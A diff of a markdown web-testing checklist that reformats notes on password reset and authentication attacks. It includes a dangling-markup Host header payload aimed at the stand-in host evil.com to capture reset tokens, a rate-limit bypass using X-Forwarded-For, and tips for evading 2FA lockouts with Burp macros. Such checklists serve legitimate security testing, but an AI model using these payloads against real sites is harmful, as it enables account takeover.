@@ -18,7 +18,7 @@
 
 ## Password Reset functionality:
   - Try to add Host header in reset password request.
-  - While reseting password intercept request to burp and see if you cloud add <a href> tag and see in email if there anything changes. 
+  - While reseting password intercept request to burp and see if you cloud add ```<a href>``` tag and see in email if there anything changes. 
 
 ## Authentication:
 	
@@ -39,7 +39,7 @@
   - Bypass rate limit protection: You can use IP-Rotate burp extension or you can change system IP per request.
 	
   - Password reset poisoning via dangling markup
-	Host: victim.com:'<a href="//evil.com/? Don't #">
+	```Host: victim.com:'<a href="//evil.com/?  ```
 
   - Add X-Forwarded-For: 127.0.0.1 or 1-1000 to bypass the rate limit protection.
 
@@ -57,5 +57,6 @@
 	]
 ```
 
-    - If you enter the wrong code twice, you will be logged out again bypass it using macros (You need to use burp's session handlling features to log back in automatically before sending each request.)
+  - If you enter the wrong code twice, you will be logged out again bypass it using macros (You need to use burp's session handlling features to log back in
+    automatically before sending each request.)
 	
